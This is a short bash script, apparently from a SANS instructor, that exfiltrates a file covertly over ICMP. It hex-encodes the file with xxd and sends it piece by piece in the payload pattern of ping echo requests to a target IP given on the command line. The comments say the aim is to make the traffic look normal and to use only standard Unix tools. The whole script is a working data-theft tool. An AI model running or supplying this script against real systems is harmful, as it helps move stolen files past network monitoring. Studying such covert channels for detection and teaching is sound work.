#!/usr/bin/env bash

###
#
#  This script will exfiltrate a file via ICMP.
#  The goal is to exfiltrate data using ICMP echo requests that
#  are as "normal" as possible. We are also not using any malware,
#  but only utilities commonly found on Unix systems. The trick
#  exploited is the use of the "pattern" option in ping that will
#  allow us to swap the echo request payload for an arbitrary
#  pattern.
#  
#  This script takes two parameters:
#  - The file to be exfiltrated
#  - The target IP address for the ICMP echo requests
#
#  Requirements:
#  - xxd : needed to convert file to hex
#  - ping: in order to exfiltrate the file
#
#  created by Johannes Ullrich jullrich@sans.edu.
#  Creative Commons Attribution-NonComercial-ShareAlike license
#  https://creativecommons.org/licenses/by-nc-sa/4.0/
###

if [ "$#" != 2 ]; then
    echo "Exactly two arguments required. Filename and target IP. usage: ./ICMPCoverChannle.sh file.abc 192.0.2.1"
    exit
fi

readonly filename=$1
readonly target=$2

if [ ! -f $filename ]; then
    echo "Sorry, I can not find the file '$filename' to exfiltrate."
    exit
else
    echo "file '$filename' exists"
fi

if [ "`ping -c 1 $target`" ]; then
    echo "target reachable"
else
    echo "The target '$target' is not reachable. I will still run."
fi

for line in `cat $filename | xxd -p -c 16`; do
    ping -c 1 -p $line $target
done

echo "Exfil done.";

